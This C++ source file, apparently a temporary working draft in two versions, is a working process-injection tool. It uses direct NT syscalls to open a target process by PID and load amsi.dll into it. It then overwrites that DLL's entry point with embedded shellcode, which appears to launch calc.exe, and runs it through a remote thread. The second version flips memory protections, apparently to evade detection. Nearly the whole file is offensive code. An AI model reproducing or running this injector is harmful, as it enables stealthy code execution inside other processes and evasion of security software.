#include <Windows.h>
#include <iostream>
#include <stdio.h>
#include <psapi.h>
#include "allcalls.h"

// TEMP FILE

unsigned char shellcode[] = "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"
"\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff"
"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c"
"\x63\x2e\x65\x78\x65\x00";


HANDLE getHandle(int processID) {

    HANDLE targetProcHandle;
    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa, NULL, 0, NULL, NULL);
    CLIENT_ID cid;
    cid.UniqueProcess = (PVOID)processID;
    cid.UniqueThread = 0;

    NtOpenProcess(&targetProcHandle, PROCESS_ALL_ACCESS, &oa, &cid);

    return targetProcHandle;

}


int main(int argc, char** argv) {

    char* holderID = argv[1];
    int PID = atoi(holderID);
    

    
    PVOID remoteBuffer;
    wchar_t moduleToInject[] = L"C:\\Windows\\system32\\amsi.dll";
    HMODULE modules[256] = {};
    SIZE_T modulesSize = sizeof(modules);
    DWORD modulesSizeNeeded = 0;
    DWORD moduleNameSize = 0;
    SIZE_T modulesCount = 0;
    CHAR remoteModuleName[128] = {};
    HMODULE remoteModule = NULL;
    PVOID buf = nullptr;

    SIZE_T sizemod = sizeof(moduleToInject);
    size_t shellsize = sizeof(shellcode);
    SIZE_T byteswritten;
    HANDLE processHandle = getHandle(PID);

    //remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof(moduleToInject), MEM_COMMIT, PAGE_READWRITE);
    NtAllocateVirtualMemory(processHandle, &remoteBuffer, 0, &sizemod, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    NtWriteVirtualMemory(processHandle, remoteBuffer, (LPVOID)moduleToInject, sizemod, &byteswritten);

    std::cout << "buff at :" << remoteBuffer;

    //WriteProcessMemory(processHandle, remoteBuffer, (LPVOID)moduleToInject, sizeof moduleToInject, NULL);


    PTHREAD_START_ROUTINE threadRoutine = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT("Kernel32")), "LoadLibraryW");
    
    HANDLE dllThread;
    NtCreateThreadEx(&dllThread, GENERIC_EXECUTE, NULL, processHandle, threadRoutine, remoteBuffer, FALSE, 0, 0, 0, nullptr);

    //HANDLE dllThread = CreateRemoteThread(processHandle, NULL, 0, threadRoutine, remoteBuffer, 0, NULL);
    
    WaitForSingleObject(dllThread, 1000);

    EnumProcessModules(processHandle, modules, modulesSize, &modulesSizeNeeded);
    modulesCount = modulesSizeNeeded / sizeof(HMODULE);
    for (size_t i = 0; i < modulesCount; i++)
    {
        remoteModule = modules[i];
        GetModuleBaseNameA(processHandle, remoteModule, remoteModuleName, sizeof(remoteModuleName));
        if (std::string(remoteModuleName).compare("amsi.dll") == 0)
        {
            std::cout << remoteModuleName << " at " << modules[i];
            break;
        }

    }

    DWORD headerBufferSize = 0x1000;
    LPVOID targetProcessHeaderBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, headerBufferSize);
    //ReadProcessMemory(processHandle, remoteModule, targetProcessHeaderBuffer, headerBufferSize, NULL);
    NtReadVirtualMemory(processHandle, remoteModule, targetProcessHeaderBuffer, headerBufferSize, NULL);

    //Done HERE
    

    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)targetProcessHeaderBuffer;
    PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)targetProcessHeaderBuffer + dosHeader->e_lfanew);
    LPVOID dllEntryPoint = (LPVOID)(ntHeader->OptionalHeader.AddressOfEntryPoint + (DWORD_PTR)remoteModule);

    PVOID entry2 = (LPVOID)(ntHeader->OptionalHeader.AddressOfEntryPoint + (DWORD_PTR)remoteModule);
    //WriteProcessMemory(processHandle, dllEntryPoint, (LPCVOID)shellcode, sizeof(shellcode), NULL);


    ULONG old_protect;
    NtProtectVirtualMemory(processHandle, &entry2, &shellsize, PAGE_EXECUTE_READWRITE, &old_protect);
    
    NtWriteVirtualMemory(processHandle, dllEntryPoint, &shellcode, sizeof(shellcode), nullptr);
    std::cout << ", WRITE " << dllEntryPoint;

    //NtProtectVirtualMemory(processHandle, (PVOID*)dllEntryPoint, &shellsize, PAGE_EXECUTE_READ, &old_protect);
    
    
    //CreateRemoteThread(processHandle, NULL, 0, threadRoutine, remoteBuffer, 0, NULL);
    //CreateRemoteThread(processHandle, NULL, 0, (PTHREAD_START_ROUTINE)dllEntryPoint, NULL, 0, NULL);
    
    HANDLE dll2thread;
    NtCreateThreadEx(&dll2thread, GENERIC_EXECUTE, NULL, processHandle, (PTHREAD_START_ROUTINE)dllEntryPoint, NULL, FALSE, 0, 0, 0, nullptr);

    
}



//// AFTER re changing protections:

#include <Windows.h>
#include <iostream>
#include <stdio.h>
#include <psapi.h>
#include "allcalls.h"

unsigned char shellcode[] = "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"
"\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff"
"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c"
"\x63\x2e\x65\x78\x65\x00";


HANDLE getHandle(int processID) {

    HANDLE targetProcHandle;
    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa, NULL, 0, NULL, NULL);
    CLIENT_ID cid;
    cid.UniqueProcess = (PVOID)processID;
    cid.UniqueThread = 0;

    NtOpenProcess(&targetProcHandle, PROCESS_ALL_ACCESS, &oa, &cid);

    return targetProcHandle;

}


int main(int argc, char** argv) {

    char* holderID = argv[1];
    int PID = atoi(holderID);
    

    
    PVOID remoteBuffer;
    wchar_t moduleToInject[] = L"C:\\Windows\\system32\\amsi.dll";
    HMODULE modules[256] = {};
    SIZE_T modulesSize = sizeof(modules);
    DWORD modulesSizeNeeded = 0;
    DWORD moduleNameSize = 0;
    SIZE_T modulesCount = 0;
    CHAR remoteModuleName[128] = {};
    HMODULE remoteModule = NULL;
    PVOID buf = nullptr;

    SIZE_T sizemod = sizeof(moduleToInject);
    size_t shellsize = sizeof(shellcode);
    SIZE_T byteswritten;
    HANDLE processHandle = getHandle(PID);

    //remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof(moduleToInject), MEM_COMMIT, PAGE_READWRITE);
    NtAllocateVirtualMemory(processHandle, &remoteBuffer, 0, &sizemod, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    NtWriteVirtualMemory(processHandle, remoteBuffer, (LPVOID)moduleToInject, sizemod, &byteswritten);

    std::cout << "buff at :" << remoteBuffer;

    //WriteProcessMemory(processHandle, remoteBuffer, (LPVOID)moduleToInject, sizeof moduleToInject, NULL);


    PTHREAD_START_ROUTINE threadRoutine = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT("Kernel32")), "LoadLibraryW");
    
    HANDLE dllThread;
    NtCreateThreadEx(&dllThread, GENERIC_EXECUTE, NULL, processHandle, threadRoutine, remoteBuffer, FALSE, 0, 0, 0, nullptr);

    //HANDLE dllThread = CreateRemoteThread(processHandle, NULL, 0, threadRoutine, remoteBuffer, 0, NULL);
    
    WaitForSingleObject(dllThread, 1000);

    EnumProcessModules(processHandle, modules, modulesSize, &modulesSizeNeeded);
    modulesCount = modulesSizeNeeded / sizeof(HMODULE);
    for (size_t i = 0; i < modulesCount; i++)
    {
        remoteModule = modules[i];
        GetModuleBaseNameA(processHandle, remoteModule, remoteModuleName, sizeof(remoteModuleName));
        if (std::string(remoteModuleName).compare("amsi.dll") == 0)
        {
            std::cout << remoteModuleName << " at " << modules[i];
            break;
        }

    }

    DWORD headerBufferSize = 0x1000;
    LPVOID targetProcessHeaderBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, headerBufferSize);
    //ReadProcessMemory(processHandle, remoteModule, targetProcessHeaderBuffer, headerBufferSize, NULL);
    NtReadVirtualMemory(processHandle, remoteModule, targetProcessHeaderBuffer, headerBufferSize, NULL);

    //Done HERE
    

    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)targetProcessHeaderBuffer;
    PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)targetProcessHeaderBuffer + dosHeader->e_lfanew);
    LPVOID dllEntryPoint = (LPVOID)(ntHeader->OptionalHeader.AddressOfEntryPoint + (DWORD_PTR)remoteModule);

    PVOID entry2 = (LPVOID)(ntHeader->OptionalHeader.AddressOfEntryPoint + (DWORD_PTR)remoteModule);
    PVOID entry3 = (LPVOID)(ntHeader->OptionalHeader.AddressOfEntryPoint + (DWORD_PTR)remoteModule);
    //WriteProcessMemory(processHandle, dllEntryPoint, (LPCVOID)shellcode, sizeof(shellcode), NULL);


    ULONG old_protect;
    NtProtectVirtualMemory(processHandle, &entry2, &shellsize, PAGE_READWRITE, &old_protect);
    
    NtWriteVirtualMemory(processHandle, dllEntryPoint, &shellcode, sizeof(shellcode), nullptr);
    std::cout << ", WRITE " << dllEntryPoint;

    NtProtectVirtualMemory(processHandle, &entry3, &shellsize, PAGE_EXECUTE_READ, &old_protect);
    std::cout << ", after 2nd ntprotect:" << entry2;
    //NtProtectVirtualMemory(processHandle, (PVOID*)dllEntryPoint, &shellsize, PAGE_EXECUTE_READ, &old_protect);
    
    getchar();
    //CreateRemoteThread(processHandle, NULL, 0, threadRoutine, remoteBuffer, 0, NULL);
    //CreateRemoteThread(processHandle, NULL, 0, (PTHREAD_START_ROUTINE)dllEntryPoint, NULL, 0, NULL);
    
    HANDLE dll2thread;
    NtCreateThreadEx(&dll2thread, GENERIC_EXECUTE, NULL, processHandle, (PTHREAD_START_ROUTINE)dllEntryPoint, NULL, FALSE, 0, 0, 0, nullptr);

    
}
